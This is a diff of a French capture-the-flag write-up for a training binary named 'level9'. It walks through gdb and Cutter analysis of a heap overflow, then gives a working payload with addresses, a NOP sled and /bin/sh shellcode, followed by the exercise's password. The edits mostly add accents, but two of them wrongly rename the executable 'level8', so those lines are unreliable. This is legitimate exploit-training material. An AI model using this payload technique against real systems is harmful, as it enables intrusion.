@@ -1,6 +1,6 @@
 # Level9
 
-On observe un executable a la racine `level9`
+On observe un exécutable à la racine : `level8`
 
 ```bash
 $ ./level9
@@ -11,7 +11,7 @@ $ ./level9 `python -c 'print "A"*200'`
 Segmentation fault (core dumped)
 ```
 
-On cherche donc a comprendre ce que fait l'executable
+On cherche donc à comprendre ce que fait l'exécutable
 
 ```bash
 $ gdb level9 -q
@@ -97,7 +97,7 @@ Dump of assembler code for function _ZN1N13setAnnotationEPc:
 End of assembler dump.
 ```
 
-On va utiliser `Cutter` pour avoir un idee plus clair de `level9`
+On va utiliser `Cutter` pour avoir une idée plus claire de `level8`
 
 ```bash
 $ scp -P 4242 -r level9@192.168.56.102:/home/user/level9/level9 .
@@ -105,7 +105,7 @@ $ scp -P 4242 -r level9@192.168.56.102:/home/user/level9/level9 .
 $ ./Cutter-v2.1.2-Linux-x86_64.AppImage level9
 ```
 
-_resultat sauvegarde dans [source.md](source.md)_
+_résultat sauvegardé dans [source.md](source.md)_
 
 ```bash
 $ ./level9 `python -c 'print "A"*108'`
@@ -117,7 +117,7 @@ Segmentation fault (core dumped)
 Nous avons assez de place pour mettre un `shellcode`.
 Nous partons dans cette direction dans un premier temps.
 
-Nous commencons par regarder ou sont stocke les deux objects cree
+Nous commencons par regarder où sont stocké les deux objects créé
 
 ```gdb
 (gdb) break *main+40
@@ -138,7 +138,7 @@ Breakpoint 2, 0x0804863e in main ()
 eax            0x804a078    134520952
 ```
 
-Entre les deux adresse, nous avons: <code>0x804a078 - 0x804a008 = 70<sub>16</sub> = 112<sub>10</sub></code> octets a notre disposition. De plus, nous pouvons constater que eax est dereference 2 fois
+Entre les deux adresse, nous avons: <code>0x804a078 - 0x804a008 = 70<sub>16</sub> = 112<sub>10</sub></code> octets a notre disposition. De plus, nous pouvons constater que eax est déréferencé 2 fois
 
 ```bash
    0x0804867c <+136>:    mov    eax,DWORD PTR [esp+0x10]
@@ -148,7 +148,7 @@ Entre les deux adresse, nous avons: <code>0x804a078 - 0x804a008 = 70<sub>16</sub
 
 Notre parametre aura la forme: `python -c 'print "StartAddr+0x4" + "StartAddr+0x8" + "\x90"*I + "shellcode" + "StartAddr"`
 
-On peut deja remplacer `StartAddr` puis retirer StartAddr de `112 octets`, cela nous donne:
+On peut déjà remplacer `StartAddr` puis retirer StartAddr de `112 octets`, cela nous donne:
 
 `python -c 'print "\x90"*108 + "\x0c\xa0\x04\x08"`
 
@@ -156,16 +156,11 @@ puis remplacer `StartAddr+0x4` et `StartAddr+0x8`.
 
 `python -c 'print "\x10\xa0\x04\x08\x14\xa0\x04\x08" + "\x90"*100 + "\x0c\xa0\x04\x08"'`
 
-il nous reste `100 octets` de disponible, plus qu'a mettre le shellcode et on essaye
+il nous reste `100 octets` de disponible, plus qu'à mettre le shellcode et on essaye
 
 ```shell
 level9:$ ./level9 `python -c 'print "\x10\xa0\x04\x08\x14\xa0\x04\x08" + "\x90"*55 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" + "\x0c\xa0\x04\x08"'`
 $ cat /home/user/bonus0/.pass
 f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
 Ctrl+D
-
-level9:$ su bonus0
-Password:
-
-bonus0:$
 ```
